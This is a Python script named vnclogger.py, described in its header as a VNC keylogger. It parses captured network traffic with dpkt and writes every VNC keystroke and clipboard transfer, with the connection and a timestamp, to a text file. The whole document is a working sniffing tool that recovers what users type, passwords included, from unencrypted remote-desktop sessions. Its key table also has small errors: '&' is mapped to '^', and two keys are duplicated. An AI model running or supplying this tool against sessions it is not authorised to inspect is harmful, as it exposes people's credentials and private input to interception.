#!/usr/bin/env python

# vnclogger.py - VNC Keylogger
# Jon Oberheide <jon@oberheide.org>
# http://jon.oberheide.org

import sys, time, signal, getopt, socket
import dpkt

FILTER = 'port 5900'

translate = {
  0x0021:'!', 0x0022:'"', 0x0023:'#', 0x0024:'$', 0x0025:'%', 0x0026:'^',
  0x0027:'\'', 0x0028:'(', 0x0029:')', 0x002a:'*', 0x002b:'+', 0x002c:',',
  0x002d:'-', 0x002e:'.', 0x002f:'/', 0x0030:'0', 0x0031:'1', 0x0032:'2',
  0x0033:'3', 0x0034:'4', 0x0035:'5', 0x0036:'6', 0x0037:'7', 0x0038:'8',
  0x0039:'9', 0x003a:':', 0x003b:';', 0x003c:'<', 0x003d:'=', 0x003e:'>',
  0x003f:'?', 0x0040:'@', 0x0041:'A', 0x0042:'B', 0x0043:'C', 0x0044:'D',
  0x0045:'E', 0x0046:'F', 0x0047:'G', 0x0048:'H', 0x0049:'I', 0x004a:'J',
  0x004b:'K', 0x004c:'L', 0x004d:'M', 0x004e:'N', 0x004f:'O', 0x0050:'P',
  0x0051:'Q', 0x0052:'R', 0x0053:'S', 0x0054:'T', 0x0055:'U', 0x0056:'V',
  0x0057:'W', 0x0058:'X', 0x0059:'Y', 0x005a:'Z', 0x005b:'[', 0x005c:'\\',
  0x005d:']', 0x005e:'^', 0x005f:'_', 0x0060:'`', 0x0061:'a', 0x0062:'b',
  0x0063:'c', 0x0064:'d', 0x0065:'e', 0x0066:'f', 0x0067:'g', 0x0068:'h',
  0x0069:'i', 0x006a:'j', 0x006b:'k', 0x006c:'l', 0x006d:'m', 0x006e:'n',
  0x006f:'o', 0x0070:'p', 0x0071:'q', 0x0072:'r', 0x0073:'s', 0x0074:'t',
  0x0075:'u', 0x0076:'v', 0x0077:'w', 0x0078:'x', 0x0079:'y', 0x007a:'z',
  0x007b:'{', 0x007c:'|', 0x007d:'}', 0x007e:'~', 0xff08:'<backspace>',
  0xff09:'<tab>', 0xff0a:'<linefeed>', 0xff0b:'<clear>', 0xff0d:'<return>',
  0xff13:'<pause>', 0xff14:'<scroll>', 0xff15:'<sysreq>', 0xff1b:'<escape>',
  0xffff:'<delete>', 0xff50:'<home>', 0xff51:'<left>', 0xff52:'<up>',
  0xff53:'<right>', 0xff54:'<down>', 0xff55:'<prior>', 0xff55:'<pageup>',
  0xff56:'<next>', 0xff56:'<pagedown>', 0xff57:'<end>', 0xff58:'<begin>',
  0xffe1:'<lshift>', 0xffe2:'<rshift>', 0xffe3:'<lctrl>', 0xffe4:'<rctrl>',
  0xffe5:'<capslock>', 0xffe6:'<shiftlock>', 0x0020:'<space>'
}


if __name__ == '__main__':

    filter = FILTER
    pcapFile = None

    opts, args = getopt.getopt(sys.argv[1:], 'f:h')
    for o, a in opts:
        if o == '-f':
            pcapFile = a
    if args:
        filter = ' '.join(args)

    if pcapFile == None:
        sys.stderr.write( "usage: %s [-f file] [pattern]\n" % sys.argv[0] )
        sys.stderr.flush()
        sys.exit(1)

    outfile = pcapFile.split('.')[0] + "_vnc_output.txt"
    ofile = open(outfile, 'w')

    ifile = open(pcapFile)
    pcap = dpkt.pcap.Reader(ifile)

    for ts, buf in pcap:
        output = None
        eth = dpkt.ethernet.Ethernet(buf)
        if isinstance(eth.data, dpkt.ip.IP):
            ip = eth.data
            if isinstance(ip.data, dpkt.tcp.TCP):
                tcp = ip.data

                try:
                    rfb = dpkt.rfb.RFB(tcp.data)
                except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                    continue

                if rfb.type == dpkt.rfb.CLIENT_KEY_EVENT or rfb.type == dpkt.rfb.CLIENT_CUT_TEXT:
                    src, dst = socket.inet_ntoa(ip.src), socket.inet_ntoa(ip.dst)
                    conn = '%s:%d-%s:%d' % (src, tcp.sport, dst, tcp.dport)

                    if rfb.type == dpkt.rfb.CLIENT_KEY_EVENT:
                        try:
                            keyevent = dpkt.rfb.KeyEvent(rfb.data)
                        except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                            continue
                        if keyevent.down_flag != 0:
                            if keyevent.key in translate:
                                keyval = translate[keyevent.key]
                                output = '%s %s: %s\n' % (conn, time.ctime(), keyval)
                            # else:
                            #     keyval = 'unknown (%d)' % keyevent.key
                            #     output = '%s %s: %s\n' % (conn, time.ctime(), keyval)

                    else:
                        try:
                            cutevent = dpkt.rfb.CutText(rfb.data)
                        except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                            continue
                        if cutevent.length > 0 and cutevent.pad == '\x00\x00\x00':
                            output = '%s %s: %s\n' % (conn, time.ctime(), cutevent.data)
        if output:
            ofile.write(output)
    ifile.close()
    ofile.close()
